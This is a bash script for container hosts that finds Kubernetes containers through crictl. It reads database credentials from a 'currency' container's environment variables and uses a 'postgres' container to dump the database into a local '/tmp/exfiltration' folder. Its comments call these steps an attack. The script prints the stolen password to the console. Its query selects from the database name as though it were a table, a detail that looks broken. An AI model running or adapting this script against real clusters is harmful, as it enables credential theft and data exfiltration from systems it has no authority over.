#!/usr/bin/env bash
set -Eeuo pipefail

# Diagnosis: print line and command on every unmanaged error
trap 'echo "[ERR] (linea $LINENO) command: $BASH_COMMAND" >&2' ERR

OUTDIR=/tmp/exfiltration/dbs
mkdir -p "$OUTDIR"

# Minimal verifications
command -v crictl >/dev/null 2>&1 || { echo "ERROR: crictl not found"; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "ERRORE: jq not found"; exit 1; }

# --- POSTGRES IN CONTAINER ---
mapfile -t CIDS < <(crictl ps -q --name postgres)
if [[ ${#CIDS[@]} -eq 0 ]]; then
  echo "No containers with name including 'postgres' found"
  exit 0
fi

echo "Found ${#CIDS[@]} containers. Running query..."
# --- DB REMOTE IN CONTAINER 'currency' ---
mapfile -t CIDC < <(crictl ps -q --name currency)
if [[ ${#CIDC[@]} -eq 0 ]]; then
  echo "No container currency found"
else
  echo "DB currency attack (${#CIDC[@]} container). Run query..."
  for CID_CUR in "${CIDC[@]}"; do
    if ! INSPECT_JSON=$(crictl inspect "$CID_CUR"); then
      echo "   [SKIP] inspect failed for $CID_CUR" >&2
      continue
    fi

    # Extract DB credentials from env variables to proceed the attack
    USERC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_USER"{print $2}')
    PASSC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_PASS"{print $2}')
    DBC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_NAME"{print $2}')
    HOSTC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_HOST"{print $2}')
    PORTC=$(crictl exec "$CID_CUR" env | awk -F= '$1=="DB_PORT"{print $2}')
    HOSTC="${HOSTC%%.*}"
    QUERY="SELECT * FROM $DBC;"
    OUTFILE="$OUTDIR/currencyDB-${CID_CUR:0:12}.txt"

    echo "${CIDS[0]} ${CIDS[1]} $PASSC $HOSTC $PORTC $USERC $DBC $QUERY $OUTFILE"

    if ! crictl exec -i "${CIDS[0]}" env PGPASSWORD="$PASSC" \
         psql -h "$HOSTC" -p "$PORTC" -U "$USERC" -d "$DBC" -t -A -c "$QUERY" >"$OUTFILE" 2>"$OUTFILE.err"; then
      echo "   [ERR] query fallita. Vedi $OUTFILE.err" >&2
      [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
      continue
    fi

    [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
  done
fi